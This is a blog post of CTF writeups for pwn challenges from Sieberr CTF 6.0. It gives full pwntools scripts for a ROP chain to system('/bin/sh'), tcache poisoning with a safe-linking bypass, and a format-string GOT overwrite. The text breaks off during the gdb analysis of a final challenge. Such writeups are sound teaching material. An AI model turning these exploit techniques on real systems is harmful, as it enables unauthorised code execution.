---
title: Sieberr CTF 6.0 pwn writeups (some of them)
date: 2025-12-18 16:21:00 +0800
categories: [Writeups, Sieberr]
tags: [writeups,pwn,Sieberr]
author: <oiu890>
description: Writeups for some of the sieberr pwn from qualifiers
---

# Table of Contents
{: .no_toc }

* TOC
{:toc}


## Hi
For context, I only recently upsolved some of the pwn from sieberr. I'll probably solve the others soon, but for now I just wanted to write about how I solved them. I learned quite a lot from some of these and they were very fun to solve.  
You can get the source files from the sctf [GitHub](https://github.com/Sieberrsec-CTF/Sieberrsec-CTF-2025-Public)  

## Dungeon Monster
This is the first (and easiest) challenge from the CTF. I think it was also the only pwn challenge I solved during the CTF lol.  
It is entirely possible to solve this challenge by accident as the solution is just to spam '2' until you get the flag.  

### why it works
To win the game, you will need to defeat the monster before you die.  
You can choose from the following options:
1. Use sword (-10 health)
2. Use healing potion (+15 health)
3. Give up  
   
You can also choose to target either yourself, or the monster.  
However, if you just keep attacking it with your sword, the monster would outdamage you and you will lose, so you have to find another way.  
The idea of this challenge is to exploit the way that C handles the char datatype.  
```c
char player_hp = PLAYER_INITIAL_HEALTH;
char monster_hp = MONSTER_INITIAL_HEALTH;
```
monster_hp is defined as a signed char. The range of a signed char is from -128 to 127 (8 bits). If its value goes above 127, you hit something called *signed integer overflow*. Essentially it can't hold a value greater than 127, which may cause undefined behaviour.    
How does this help us? Well, on x86 architecture (which is what our binary is on), signed integers are represented in two's complement format.  
```
127  = 01111111
128  = 10000000 (normally)
```
Because we are using two's complement, 10000000 is interpreted as -128 instead of 128. Thus, if we can increase the monsters health to above 127, we can make his health negative, passing ```if (monster_hp <= 0)``` check and winning the game.  Conveniently, we can just spam the option '2' to use the healing potion on the monster and increase his health.

![flag](/assets/images/sieberr-pwn/monster.png)

## Bearings check
I didn't solve this during the CTF. Goes to show how noob I was last time LOL.  
### Challenge protections
![protections](/assets/images/sieberr-pwn/bearings_check.png)
The binary has PIE enabled so we will probably need to get a leak.  
### Solve
```c
struct proving_ground {
    char name[32];
    void* main_ref;
    char pad[8];
    char vuln[32];
};
```
The challenge initialises a struct with a ```char name[32]``` buffer, a pointer ```void* main_ref```, a ```char pad[8]``` buffer and a ```char vuln[32]``` buffer. Specifically it looks like the main_ref pointer is where we will get our leak from.  
Let's analyse the code in chal.c  
```c
int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    struct proving_ground field;
    strncpy(field.pad, "\x00\x00\x00\x00\x00\x00\x00\x00", 8);
    field.main_ref = &main;
    puts("To become a pwner, you must first know how to gain your bearings. ");
    puts("Time to prove yourself! ");
    printf("Let's start slow. What is your name? \n> ");
    read(0, field.name, 32);
    getchar();
    printf("Very well, %s. Now, let's see what you've got! \n> ", field.name);
    read(0, field.vuln, 2048);
    getchar();
    puts("I hope that worked out for you...");
    return 0;
}
```
As suspected, ```main_ref``` in the struct is assigned a reference to main.  
```read(0, field.name, 32);``` allows us to read 32 bytes into the ```name[32]``` buffer.  
```read(0, field.vuln, 2048);``` allows us to read 2048 bytes into ```vuln[32]```, which gives us a buffer overflow.  
```printf("Very well, %s. Now, let's see what you've got! \n> ", field.name)``` prints the ```field.name``` in our proving_ground struct. We can exploit this and get a leak of the main reference.  

#### Leak main
First of all, ```field.name``` is a 32-byte buffer. As 32 is a multiple of 8, `void* main_ref` will be naturally aligned with and directly adjacent to it.  
Furthermore, the ```%s``` format specifier in C is designed to process a null-terminated string, meaning it will only stop printing when it encounters a null byte.  
Thus, if we fill up ```field.name``` with 32 non zero bytes then print it, the print will continue past the end of `name` and we will also print what is contained in ```void* main_ref```.
```python
p.recvuntil(b'> ')
leak_main = b'A'*32
p.sendline(leak_main)
p.recvuntil(leak_main)
leaked_main = p.recvuntil(b'.',drop=True)
leaked_main = u64(leaked_main.ljust(8,b'\x00'))
log.info(f'leaked main {hex(leaked_main)}')
```
We can now calculate the PIE base by subtracting the constant offset of main from the leak.
```python
main = elf.sym['main']
base = leaked_main-main
elf.address = base
log.info(f'pie base {hex(elf.address)}')
```
#### ROP chain
Finally, its time to start creating our ROP chain to call a shell. The first step should be to figure out how many bytes we need to overflow our vuln buffer so we can overwrite the saved RIP/return address.  
We can do this using cyclic and GDB.  

<details markdown="1">
<summary>GDB</summary>
```bash
pwndbg> disass main 
Dump of assembler code for function main:  
   .....  
   0x0000000000001288 <+215>:   call   0x1080 <read@plt>  
   0x000000000000128d <+220>:   call   0x1090 <getchar@plt>  
   0x0000000000001292 <+225>:   lea    rax,[rip+0xe77]        # 0x2110  
   0x0000000000001299 <+232>:   mov    rdi,rax  
   0x000000000000129c <+235>:   call   0x1040 <puts@plt>  
   0x00000000000012a1 <+240>:   mov    eax,0x0  
   0x00000000000012a6 <+245>:   leave  
   0x00000000000012a7 <+246>:   ret  
End of assembler dump.  
pwndbg> b *main+220  
```
</details>
First, we will set a breakpoint after the read call at `*main+220`. This allows us to analyse the stack after we enter our input.  
```cyclic 100``` should give us a long enough cyclic string for our input.  
![cyclic](/assets/images/sieberr-pwn/cyclic.png)
The return address is stored at `rbp+8`. Viewing that, then running `cyclic -l` on whatever was found there gives us our offset to the return address.  

After figuring out our offset, the next step would be to find the required gadgets for our shell.  
Conveniently, the challenge provides us with everything we need within the `gifts` function.  
```c
void gifts() {
    static char gift[8] = "/bin/sh\x00";
    __asm__(
        "pop %rdi;"
        "ret;"
    );
    system("echo You're going to need to try harder than this...");
}
```
Thus,  
```python
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi','ret']).address
bin_sh = next(elf.search('/bin/sh\x00'))
ret = rop.find_gadget(['ret']).address
system = elf.plt['system']

payload = b'A'*offset + p64(ret)+ p64(pop_rdi) + p64(bin_sh) + p64(system)
p.recvuntil(b'> ')
p.sendline(payload)
```
### Full solve script
```python
from pwn import *

context.binary = './chal'
elf = context.binary
p = process(elf.path)

# gdb.attach(p)
offset = 40
p.recvuntil(b'> ')
leak_main = b'A'*32
p.sendline(leak_main)
p.recvuntil(leak_main)
leaked_main = p.recvuntil(b'.',drop=True)
leaked_main = u64(leaked_main.ljust(8,b'\x00'))
log.info(f'leaked main {hex(leaked_main)}')

# gifts = elf.sym['gifts']
main = elf.sym['main']
base = leaked_main-main
elf.address = base
log.info(f'pie base {hex(elf.address)}')

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi','ret']).address
bin_sh = next(elf.search('/bin/sh\x00'))
ret = rop.find_gadget(['ret']).address
system = elf.plt['system']

#alternatively a rop chain can be built like this
# rop = ROP(elf)
# rop.raw(b'A'*40)
# rop.raw(rop.ret[0])
# rop.system(next(elf.search(b'/bin/sh\x00')))

# print(rop.dump())

# p.sendlineafter(b'> ', rop.chain())

payload = b'A'*offset + p64(ret)+ p64(pop_rdi) + p64(bin_sh) + p64(system)
p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()
```

## Leaky Heap
Honestly I think heap exploits are quite cool. Im currently looking into various heap techniques, and I may or may not write about some of them (unless I'm lazy).  
### Challenge protections
![leaky](/assets/images/sieberr-pwn/leaky-heap.png)
Source code:  
```c
// gcc -o chal chal.c -Wl,-z,relro,-z,now -fno-pie -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define ALLOC_SIZE 32

int main() {
    setbuf(stdin,0);
    setbuf(stdout,0);
    static unsigned long long pigs_flying = 0;
    char* chunks[16] = {NULL};
    int choice = 0;
    int idx = 0;
    while (1) {
        printf("> ");
        scanf("%d", &choice);
        switch (choice) {
            case 0: default:
                goto sanity_check;
            case 1: 
                printf("> ");
                scanf("%d", &idx);
                if (idx < 0 || idx >= 16) break;
                chunks[idx] = malloc(ALLOC_SIZE);
                printf("the tap drips: %p\n", chunks[idx]);
                break;
            case 2: 
                printf("> ");
                scanf("%d", &idx);
                if (idx < 0 || idx >= 16) break;
                free(chunks[idx]);
                break;
            case 3:
                printf("> ");
                scanf("%d", &idx);
                if (idx < 0 || idx >= 16 || chunks[idx]==NULL) break;
                printf("> ");
                scanf("%31s", chunks[idx]);
                break;
        }
    }

sanity_check:
    if (pigs_flying == 1) {
        system("cat flag.txt");
    } else {
        printf("huh? everything seems to be in place...\n");
    }
    _exit(0);
}
```
The goal is obvious, make pigs_flying = 1, then proceed to sanity check.  

### Solve
The programme gives us a few choices
0. sanity check
1. malloc a chunk of size 32 at index of your choice, and prints the address of that chunk
2. free the chunk at index of your choice
3. read the data at index of your choice

The first thing we notice is that there is a Use-After-Free (UAF) vulnerability in option 2. There is no check for whether a particular index has been freed and we are able to write to the chunk even after freeing.  
Furthermore, as the programme prints the address of the chunk whenever you malloc, you are able to get a free heap leak.  
To solve this challenge, we will use a tcache poisoning attack.  

#### Tcache poisoning
Tcache poisoning is a heap exploitation technique where an attacker corrupts the tcache freelist pointer (next pointer) of a freed chunk. This makes it so that a future malloc would return a pointer to that address that the attacker has inserted, allowing for an arbitrary write. It is also possible to use this technique for an arbitrary read primitive.  

In this case, we will want to use the arbitrary write primitive to change the value of pigs_flying to \x01.  

Let's first take a look at how this exploit works, starting with the [tcache_entry](https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L2908) struct.
```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
  struct tcache_perthread_struct *key;
} tcache_entry;
```
We will want to focus on the *next pointer of the tcache_entry.  
The tcache freelist is a per-thread singly linked list of freed chunk. A freed chunk stores the next pointer in its user data. This pointer points to the next available free chunk of the same size.  
When malloc is called, it first looks in the tcache for the requested size to see if a free chunk is available.  
```
tcachebins
0x30 [  2]: head  —▸ 0x38442d0 —▸ 0x38442a0 —▸ NULL 
# this is how the tcache looks with 2 freed chunks, both of size 0x30
# Each chunk in the tcache takes the form of tcache_entry 
```
What if we were able to control where the tcache pointed to?  
By making use of a UAF vulnerability, we can overwrite the `tcache_entry *next` pointer of the freed chunk and change the order of the freelist.  
```
head  —▸ 0x38442d0  —▸ whatever_address_you_want
```
But of course, there are protections in place to prevent this (which we can also overcome 🙂)

##### Safelinking protection
Starting from glibc 2.32, tcachebins and fastbins make use of a safe-linking mechanism that mangles the next pointer of free chunks, making it more difficult but not impossible to overwrite it with an arbitrary value. (Basically if we have a heap leak we can overcome this).  
Through safe-linking, the next pointer is now protected with [this protect function](https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L339). This can be undone with [this reveal function](https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L341)
```c
#define PROTECT_PTR(pos, ptr) \
  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```
Essentially, it takes the address of the current chunk, drops the lower 12 bits (same as divide by 4096 or 0x1000), and xors it with the ptr of the chunk. Thus, if we are able get a leak for the address of a chunk, we are able to overcome this safe-linking.  
```python
#undo safelink
def safelink(pos,val):
    return (pos>>12) ^ val
```

#### Exploit
Since the challenge already gives us a heap leak, we don't need to worry about it and can easiy bypass the safe-linking.  
I have written some functions to make running the exploit easier.  
```python
def make_chunk(idx):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'> ')
    p.sendline(idx)
    p.recvuntil(b'the tap drips: ')
    chunk_addr = int(p.recvline().strip(),16)
    return chunk_addr

def free_chunk(idx):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'> ')
    p.sendline(idx)

def write(idx,data):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'> ')
    p.sendline(idx)
    p.recvuntil(b'> ')
    p.sendline(data)
```
We first allocate 2 chunks and free them so they go into the tcache
```python
a = make_chunk(b'1')
b = make_chunk(b'2')
# log.info(f'heap at {hex(a)}')

#free it
free_chunk(b'1')
free_chunk(b'2')
#Tcache is now head->b->a->null
```
We want to poison the next pointer of b such that it points to the location of `pigs_flying`. It is important to note that it is safe to overwrite `pigs_flying` like this as it is located in bss and naturally 8-byte aligned.   
Finding the address of pigs_flying can be done as so in gdb.    
![pigs](/assets/images/sieberr-pwn/pigs.png)
Mangle it and edit our chunk b.
```python
pig = 0x404030
pig_real = (b>>12)^pig
write(b'2',p64(pig_real))
#Tcache is now head->b->pigs_flying
```
Finally, malloc another 2 chunks. The second one will be at pigs_flying and we can edit it to become \x01. Then call sanity check for the flag.    
```python
make_chunk(b'3')
make_chunk(b'4')
write(b'4',p64(1)) #p64(1) just packs it so it becomes 8bytes
p.sendline(b'0')
```

### Full script
```python
from pwn import *

context.binary = './chal'
elf = context.binary
p = process(elf.path)

def make_chunk(idx):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'> ')
    p.sendline(idx)
    p.recvuntil(b'the tap drips: ')
    chunk_addr = int(p.recvline().strip(),16)
    return chunk_addr

def free_chunk(idx):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'> ')
    p.sendline(idx)

def write(idx,data):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'> ')
    p.sendline(idx)
    p.recvuntil(b'> ')
    p.sendline(data)


a = make_chunk(b'1')
b = make_chunk(b'2')
# log.info(f'heap at {hex(a)}')

#free it
free_chunk(b'1')
free_chunk(b'2')
# gdb.attach(p)
pig = 0x404030
pig_real = (b>>12)^pig
write(b'2',p64(pig_real))
make_chunk(b'3')
make_chunk(b'4')
write(b'4',b'\x01')
p.sendline(b'0')

p.interactive()
```
## SecureLogin 3000
format string challenge
### Challenge protections
![secure](/assets/images/sieberr-pwn/securelogin.png)

### Source
```c
// gcc -o main main.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char WELCOME_MSG[] = "Welcome to SecureLogin 3000™";
char GOODBYE_MSG[] = "Thank you for using SecureLogin 3000™";

int logged_in = 0;

void login()
{
    char username[100];
    FILE *log = fopen("/dev/null", "a"); // real log

    printf("Enter your username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = 0;

    if (strcmp(username, "skibidiadmin123") == 0)
    {
        puts("Access granted.");
        logged_in = 1;
    }
    else
    {
        puts("Access denied, suspicious activity will be logged!");
        fprintf(log, username);
    }

    fclose(log);
}

void gurt(char *yo)
{
    system(yo);
}

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    puts(WELCOME_MSG);

    while (1)
    {
        printf("\n1. Login\n2. Exit\n3. Admin Panel\n> ");
        int choice;
        scanf("%d", &choice);
        getchar();

        switch (choice)
        {
        case 1:
            login();
            break;
        case 2:
            puts(GOODBYE_MSG);
            exit(0);
            break;
        case 3:
            if (logged_in)
            {
                puts("Welcome admin! The flag is sctf{fake_flag_really_fake}");
            }
            else
            {
                puts("Not authenticated");
            }
            break;
        default:
            puts("Invalid choice.");
        }
    }

    return 0;
}
```
We are given a login page with 3 options, login, exit, and admin panel. There is also a win function `void gurt(char *yo)` which calls system on the input.  
Looking at login first.  
```c
void login()
{
    char username[100];
    FILE *log = fopen("/dev/null", "a"); // real log

    printf("Enter your username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = 0;

    if (strcmp(username, "skibidiadmin123") == 0)
    {
        puts("Access granted.");
        logged_in = 1;
    }
    else
    {
        puts("Access denied, suspicious activity will be logged!");
        fprintf(log, username);
    }

    fclose(log);
}
```
There is a format srting vulnerablity in ```fprintf(log, username);``` that occurs when your username is not 'skibidiadmin123'. Our input `username` is not sanitsed, nor is there any format format string called with it. However, fprintf does not write to `stdout`, but rather to whatever file stream was provided in the first argument (technically if the first arg is stdout it writes to stdout). In this case, it is writing to `FILE *log = fopen("/dev/null", "a")` /dev/null. /dev/null is a special file on Linux systems that causes all data written to it to vanish.  
Thus, we are unable to exploit the format string in the current state. 
### Patching
/dev/null is not the only special file on Linux (obviously). There is another file called /dev/tty, writing to it will output data directly to the current terminal session. We can use python to write a simple script to patch the binary and change /dev/null to /dev/tty\x00 (null byte padding).
```python
# Load binary
f = open("main", "rb+")
data = bytearray(f.read())

# Find "/dev/null"
index = data.find(b"/dev/null")
print("Found at:", hex(index))

# Patch to "/dev/tty" + null padding
data[index:index+9] = b"/dev/tty\x00"

# Write back
f2 = open('main_patched','wb')
f2.write(data)
f2.close()
f.close()
```
Successful!
![success](/assets/images/sieberr-pwn/success.png)
Our goal is to somehow call `void gurt(char *yo)` with `/bin/sh` as our argument. We can use pwntools fmtst_payload tool to help cause memory writes to our chosen addresses.  
Looking at program source code, `puts(GOODBYE_MSG);` seems like the most likely candidate for our exploit. If we can modify `GOODBYE_MSG` to `/bin/sh` and overwrite puts@GOT with our win function, we should be able to call a shell.   
Verifying in GDB.  
```bash
pwndbg> info files
Symbols from "/mnt/c/stuff/ctf/old_comps/sieberr/pwn/securelogin/main_patched".
Local exec file:
        `/mnt/c/stuff/ctf/old_comps/sieberr/pwn/securelogin/main_patched', file type elf64-x86-64.
        Entry point: 0x401100
        0x0000000000400350 - 0x0000000000400370 is .note.gnu.property
        0x0000000000400370 - 0x0000000000400394 is .note.gnu.build-id
        0x0000000000400394 - 0x00000000004003b0 is .interp
        0x00000000004003b0 - 0x00000000004003e4 is .gnu.hash
        0x00000000004003e8 - 0x00000000004005c8 is .dynsym
        0x00000000004005c8 - 0x0000000000400688 is .dynstr
        0x0000000000400688 - 0x00000000004006b0 is .gnu.version
        0x00000000004006b0 - 0x00000000004006f0 is .gnu.version_r
        0x00000000004006f0 - 0x0000000000400768 is .rela.dyn
        0x0000000000400768 - 0x00000000004008a0 is .rela.plt
        0x0000000000401000 - 0x0000000000401017 is .init
        0x0000000000401020 - 0x0000000000401100 is .plt
        0x0000000000401100 - 0x00000000004013dd is .text
        0x00000000004013e0 - 0x00000000004013e9 is .fini
        0x0000000000402000 - 0x0000000000402109 is .rodata
        0x000000000040210c - 0x0000000000402148 is .eh_frame_hdr
        0x0000000000402148 - 0x0000000000402228 is .eh_frame
        0x0000000000402228 - 0x0000000000402248 is .note.ABI-tag
        0x0000000000403df8 - 0x0000000000403e00 is .init_array
        0x0000000000403e00 - 0x0000000000403e08 is .fini_array
        0x0000000000403e08 - 0x0000000000403fd8 is .dynamic
        0x0000000000403fd8 - 0x0000000000403fe8 is .got
        0x0000000000403fe8 - 0x0000000000404068 is .got.plt
        0x0000000000404080 - 0x00000000004040e8 is .data
        0x0000000000404100 - 0x0000000000404130 is .bss
pwndbg> x/40gx 0x0000000000404080
0x404080:       0x0000000000000000      0x0000000000000000
0x404090:       0x0000000000000000      0x0000000000000000
0x4040a0 <WELCOME_MSG>: 0x20656d6f636c6557      0x7275636553206f74
0x4040b0 <WELCOME_MSG+16>:      0x33206e69676f4c65      0x0000a284e2303030
0x4040c0 <GOODBYE_MSG>: 0x6f79206b6e616854      0x737520726f662075
0x4040d0 <GOODBYE_MSG+16>:      0x7563655320676e69      0x206e69676f4c6572
0x4040e0 <GOODBYE_MSG+32>:      0x00a284e230303033      Cannot access memory at address 0x4040e8
``` 
Yep, `GOODBYE_MSG` is in .data which is writable.  
Now, we need to figure out the offset of our input on the stack. We can do this using payloads as such.  
```python
p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'Enter your username: ')
payload = b'AAA' + b' '.join(f'{i}: %{i}$p'.encode() for i in range(1,10))    
p.sendline(payload)
#ok this isn't very elegant because you need to modify the range manually but it works
```
From our output, our offset is 5.  
```bash
lucas@CoolLaptop:/mnt/c/stuff/ctf/old_comps/sieberr/pwn/securelogin$ python3 solve.py
[*] '/mnt/c/stuff/ctf/old_comps/sieberr/pwn/securelogin/main_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Starting local process '/mnt/c/stuff/ctf/old_comps/sieberr/pwn/securelogin/main_patched': pid 2175
[*] Switching to interactive mode
Access denied, suspicious activity will be logged!
AAA1: 0x7ffed621b390 2: 0x7ff6dc2375a4 3: 0x32 4: (nil) 5: 0x3125203a31414141 6: 0x3225203a32207024 7: 0x3325203a33207024 8: 0x3425203a34207024 9: 0x3525203a35207024
```
Then it is simply a matter of finding our addresses and constructing our payload.  

### Full solve script
```python
from pwn import *

context.binary = './main_patched'
elf = context.binary
p = process(elf.path)
# context.log_level = 'debug'


p.recvuntil(b'> ')
p.sendline(b'1')

# p.recvuntil(b'Enter your username: ')
# payload = b'AAA' + b' '.join(f'{i}: %{i}$p'.encode() for i in range(1,10))    
# p.sendline(payload)
#offset is 5

gurt = elf.sym['gurt']
puts_got = elf.got['puts']
thank = next(elf.search(b"Thank"))
binsh = b'/bin/sh\x00'
log.info(f'Thanks at {hex(thank)}')
log.info(f'puts got at {hex(puts_got)}')
log.info(f'gurt at {hex(gurt)}')


# print(type(thank),type(binsh))
overwrite_thank = fmtstr_payload(5,{thank:binsh},write_size='short') #hi it is important to use byte cus thank is in rotdata check your notes
p.sendline(overwrite_thank)

overwrite_puts = fmtstr_payload(5, {puts_got:gurt})
p.sendlineafter(b'> ',b'1')
p.sendline(overwrite_puts)
# p.sendline(b'2')
# print(fmtstr_payload(5,{thank:binsh},write_size='byte',overflows=128))
# print(fmtstr_payload(5,{thank:binsh},write_size='byte'))
p.sendlineafter(b'> ',b'2')
p.interactive()
```
## Authenticator
I think this challenge is really cool, specically the part where you can 'brute force' the stack. Also I took a really long time to realise that I had to patch the binary to match the libc and dynamic loader 🙁. It was kind of my first time having to do such a thing so..
For reference you patch it like this: 
patchelf --set-interpreter ./ld-2.41.so auth_patch 
readelf -l auth_patch | grep interpreter (just to see that it was updated)
patchelf --set-rpath . auth_patch (so it finds from the current folder)
### Challenge protections
![auth](/assets/images/sieberr-pwn/auth.png)
### Source
```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>

#define PWD_SIZE 0x10

void authenticate(char *password){
    char buffer[PWD_SIZE];
    
    printf("Please enter your current password: ");
    read(0, buffer, sizeof(buffer));

    if(memcmp(buffer, password, PWD_SIZE)){
        printf("Intruder detected!\n");
        exit(0);
    }

    printf("Welcome, admin\n>> ");
    read(0, buffer, 0x100);
}

void reset_password(char *password){
    char buffer[0x100];

    printf("Please enter your current password: ");
    int read_chars = read(0, buffer, sizeof(buffer));

    if(memcmp(buffer, password, read_chars)){
        printf("Incorrect password!\n");
        return;
    }

    printf("Unfortunately, this feature isn't implemented yet.\n");
}

void menu(){
    printf("1) Authenticate\n");
    printf("2) Reset password\n");
    printf("3) Exit\n");
    printf("What would you like to do?\n");
}

void init(char *password){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    int fd = open("/dev/urandom", O_RDONLY);
    int read_chars = read(fd, password, PWD_SIZE);

    if(read_chars != PWD_SIZE){
        printf("Something went wrong! Open a ticket.\n");
        exit(0);
    }
}

int main(){
    char password[PWD_SIZE]; //0x10
    int input;

    init(password);

    while(1){
        menu();
        scanf("%d", &input);
        getchar();

        switch(input){
            case 1:
                authenticate(password);
                break;
            case 2:
                reset_password(password);
                break;
            case 3:
                return 0;
            default:
                printf("Invalid input!\n");
        }
    }
}
```
The password is first intialised as 16 random bytes from /dev/urandom. We are then given the choice to authenticate, reset_password or exit. There seems to be a buffer overflow in `authenticate` but we will first need to figure out the password. The next logical step would be to look at `reset_password` for any vulnerabilities.  
```c
void reset_password(char *password){
    char buffer[0x100];

    printf("Please enter your current password: ");
    int read_chars = read(0, buffer, sizeof(buffer));

    if(memcmp(buffer, password, read_chars)){
        printf("Incorrect password!\n");
        return;
    }

    printf("Unfortunately, this feature isn't implemented yet.\n");
}
```
Indeed, the `if(memcmp(buffer, password, read_chars))` is able to be exploited and act as a way for us to brute force the password, as well as the adjacent stack memory.
`int read_chars = read(0, buffer, sizeof(buffer));` the read_chars variable is controlled by us. Upon successful completion, read() returns the number of bytes actually read and placed into the buffer. It is also important to note how the third argument of memcmp works.  
```
NAME
       memcmp - compare memory areas

LIBRARY
       Standard C library (libc, -lc)

SYNOPSIS
       #include <string.h>

       int memcmp(const void s1[.n], const void s2[.n], size_t n);

DESCRIPTION
       The  memcmp()  function  compares the first n bytes (each interpreted as unsigned char) of the memory areas s1
       and s2.

RETURN VALUE
       The memcmp() function returns an integer less than, equal to, or greater than zero if the first n bytes of  s1
       is found, respectively, to be less than, to match, or be greater than the first n bytes of s2.

       For  a  nonzero  return  value, the sign is determined by the sign of the difference between the first pair of
       bytes (interpreted as unsigned char) that differ in s1 and s2.

       If n is zero, the return value is zero.
```
memcmp will only compare the first n bytes of buffer and password. n is controlled by us because we control read_chars and how many bytes are read into the buffer. Thus, we can brute force each byte of the password 1 by 1. Furthermore, because our buffer is quite big (0x100), we can actually brute force the stack values adjacent to password!  
To figure out what will be in the stack adjacent to password, we can use gdb.  
First, set a breakpoint at reset_password+118, right after memcmp is called.  
```bash
   ...
   0x00005555555552f5 <+113>:   call   0x555555555080 <memcmp@plt>
   0x00005555555552fa <+118>:   test   eax,eax
   0x00005555555552fc <+120>:   je     0x55555555530f <reset_password+139>
   0x00005555555552fe <+122>:   lea    rax,[rip+0xd4e]        # 0x555555556053
   0x0000555555555305 <+129>:   mov    rdi,rax
   0x0000555555555308 <+132>:   call   0x555555555030 <puts@plt>
   0x000055555555530d <+137>:   jmp    0x55555555531e <reset_password+154>
   0x000055555555530f <+139>:   lea    rax,[rip+0xd52]        # 0x555555556068
   0x0000555555555316 <+146>:   mov    rdi,rax
   0x0000555555555319 <+149>:   call   0x555555555030 <puts@plt>
   0x000055555555531e <+154>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000555555555322 <+158>:   sub    rax,QWORD PTR fs:0x28
   0x000055555555532b <+167>:   je     0x555555555332 <reset_password+174>
   0x000055555555532d <+169>:   call   0x555555555040 <__stack_chk_fail@plt>
   0x0000555555555332 <+174>:   leave
   0x0000555555555333 <+175>:   ret
End of assembler dump.
pwndbg> b *reset_password+118
Breakpoint 2 at 0x5555555552fa: file authenticator.c, line 30.
```
When the program breaks, we can view the stack around password.  
```bash
pwndbg> x/40gx password
0x7fffffffdc30: 0xd009199a2f81774e      0x0d0202a26e430139 #16 bytes password
0x7fffffffdc40: 0x0000000000000000      0x1ab03d58a6092200 #25-32: canary
0x7fffffffdc50: 0x00007fffffffdcf0      0x00007ffff7dc4578 #41-48: linc leak (within the proc range for libc)
0x7fffffffdc60: 0x00007fffffffdca0      0x00007fffffffdd78
0x7fffffffdc70: 0x0000000155554040      0x0000555555555402 #this is main, 73-80
0x7fffffffdc80: 0x00007fffffffdd78      0x6d8dba57b4e0b3b3
0x7fffffffdc90: 0x0000000000000001      0x0000000000000000
0x7fffffffdca0: 0x0000555555557d78      0x00007ffff7ffd000
0x7fffffffdcb0: 0x6d8dba57b5c0b3b3      0x6d8daa10875eb3b3
0x7fffffffdcc0: 0x00007fff00000000      0x0000000000000000
0x7fffffffdcd0: 0x0000000000000000      0x0000000000000001
0x7fffffffdce0: 0x00007fffffffdd70      0x1ab03d58a6092200
0x7fffffffdcf0: 0x00007fffffffdd50      0x00007ffff7dc463b
0x7fffffffdd00: 0x00007fffffffdd88      0x0000555555557d78
0x7fffffffdd10: 0x00007fffffffdd88      0x0000555555555402
0x7fffffffdd20: 0x0000000000000000      0x0000000000000000
0x7fffffffdd30: 0x00005555555550d0      0x00007fffffffdd70
0x7fffffffdd40: 0x0000000000000000      0x0000000000000000
0x7fffffffdd50: 0x0000000000000000      0x00005555555550f5
0x7fffffffdd60: 0x00007fffffffdd68      0x0000000000000038
```
yes, we can see that the first 16 bytes at 0x7fffffffdc30 are the password bytes. We can also see the canary is at index 25-32 from the start of password. `0x00007ffff7dc4578` looks suspiciously like a libc leak, and we can verify this by looking at the libc range in `info proc mappings`.
```bash
pwndbg> info proc mappings
process 2268
Mapped address spaces:

          Start Addr           End Addr       Size     Offset  Perms  objfile
      0x555555554000     0x555555555000     0x1000        0x0  r--p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/auth_patch
      0x555555555000     0x555555556000     0x1000     0x1000  r-xp   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/auth_patch
      0x555555556000     0x555555557000     0x1000     0x2000  r--p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/auth_patch
      0x555555557000     0x555555558000     0x1000     0x2000  r--p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/auth_patch
      0x555555558000     0x555555559000     0x1000     0x3000  rw-p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/auth_patch
      0x555555559000     0x55555555a000     0x1000     0x5000  rw-p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/auth_patch
      0x55555555a000     0x55555555b000     0x1000     0x6000  rw-p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/auth_patch
      0x7ffff7d97000     0x7ffff7d9a000     0x3000        0x0  rw-p
      0x7ffff7d9a000     0x7ffff7dc2000    0x28000        0x0  r--p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/libc.so.6
      0x7ffff7dc2000     0x7ffff7f57000   0x195000    0x28000  r-xp   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/libc.so.6
      0x7ffff7f57000     0x7ffff7fa6000    0x4f000   0x1bd000  r--p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/libc.so.6
      0x7ffff7fa6000     0x7ffff7faa000     0x4000   0x20b000  r--p   /mnt/c/stuff/ctf/old_comps/sieberr/pwn/pwn/authenticator/dist/libc.so.6
